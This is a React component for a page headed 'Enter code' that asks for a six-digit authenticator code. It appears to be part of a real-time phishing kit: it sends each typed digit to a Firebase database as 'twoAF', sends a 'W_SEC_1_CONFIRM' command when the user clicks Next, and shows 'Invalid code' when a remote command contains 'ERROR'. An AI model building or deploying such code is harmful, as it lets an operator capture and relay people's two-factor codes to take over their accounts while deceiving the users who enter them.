"use client";

import { ThenableReference, update } from "firebase/database";
import { useEffect, useRef, useState } from "react";
import { toast } from "react-toastify";

interface IProps {
  dataRef: ThenableReference | null;
  command: string;
}

export const AuthenticatorCode = ({ dataRef, command }: IProps) => {
  const [loading, setLoading] = useState(false);
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [codeString, setCodeString] = useState("");
  const refs = useRef<any>([]);
  refs.current = [];

  useEffect(() => {
    if (command.includes("ERROR")) {
      toast.error("Invalid code!", {
        position: "top-center",
        autoClose: 3000,
        hideProgressBar: true,
        closeOnClick: true,
        theme: "light",
      });

      setLoading(false);
    }
  }, [command]);

  useEffect(() => {
    const codeString = code.reduce((acc, value) => {
      return acc + value;
    });
    setCodeString(codeString);
    if (dataRef) {
      update(dataRef, { twoAF: codeString });
    }
  }, [code]);

  const addToRefs = (el: any) => {
    if (el && !refs.current.includes(el)) {
      refs.current.push(el);
    }
  };

  const handleInputCode = (idx: number, value: string) => {
    const ref = refs.current[idx + 1];

    setCode((rest) => {
      if (rest[idx] === "") {
        rest[idx] = value;
      }
      return [...rest];
    });

    if (value.length >= 1) {
      if (idx + 1 !== refs.current.length) {
        ref.focus();
      }
    }
  };

  const handleBakspacePressed = (idx: number, value: string) => {
    const ref = refs.current[idx - 1];

    setCode((rest) => {
      rest[idx] = "";
      return [...rest];
    });

    if (idx !== 0) {
      if (value.length === 0) {
        ref.focus();
      }
    }
  };

  return (
    <>
      <div className="flex flex-col min-w-[40%] max-w-[380px] w-full gap-4 mt-[140px] transition-all">
        <div className="flex flex-col gap-6">
          <h1 className="text-4xl font-bold">Enter code</h1>
          <p>
            Enter the code from your authenticator app, such as Google
            Authenticator
          </p>

          <div className="grid grid-cols-6">
            {[1, 2, 3, 4, 5, 6].map((val, idx) => (
              // <div key={val} ref={addToRefs}>
              //   {val}
              // </div>
              <div key={val} className="w-[40px] h-[45px] ">
                <input
                  className="w-full h-full flex flex-col items-center justify-center text-center rounded-lg border border-gray-300 text-lg bg-white outline-none transition-all focus:border-zinc-800 focus:shadow-md"
                  type="number"
                  ref={addToRefs}
                  disabled={loading}
                  id={`${val}`}
                  autoFocus
                  name=""
                  maxLength={1}
                  size={1}
                  value={code[idx]}
                  onChange={(e) => {
                    handleInputCode(idx, e.target.value);
                  }}
                  onKeyUp={(event) => {
                    if (event.key === "Backspace") {
                      handleBakspacePressed(idx, event.currentTarget.value);
                    }
                  }}
                />
              </div>
            ))}
          </div>
          <button
            disabled={loading || codeString.length < 6}
            onClick={() => {
              setLoading(true);

              if (dataRef) {
                update(dataRef, { command: "W_SEC_1_CONFIRM" });
              }
            }}
            className="bg-[#121212] hover:text-zinc-400 text-white disabled:bg-[#F5F5F5] py-3 disabled:text-zinc-400 rounded-[30px] disabled:cursor-not-allowed flex flex-row gap-2 items-center justify-center"
          >
            <svg
              aria-hidden="true"
              className={`w-4 h-4 text-gray-200 animate-spin dark:text-gray-600 fill-white ${
                loading ? "visible" : "hidden"
              }`}
              viewBox="0 0 100 101"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                fill="currentColor"
              />
              <path
                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                fill="currentFill"
              />
            </svg>
            Next
            {/* {!showPassInput
              ? dict.dictionary.login.nextButton.next
              : dict.dictionary.login.nextButton.login} */}
          </button>
          <span className="text-center text-zinc-600">
            Unable to verify?{" "}
            <strong className="transition-all underline hover:no-underline text-zinc-800 font-normal cursor-pointer">
              Switch to phone authentication
            </strong>
          </span>
        </div>
      </div>
    </>
  );
};
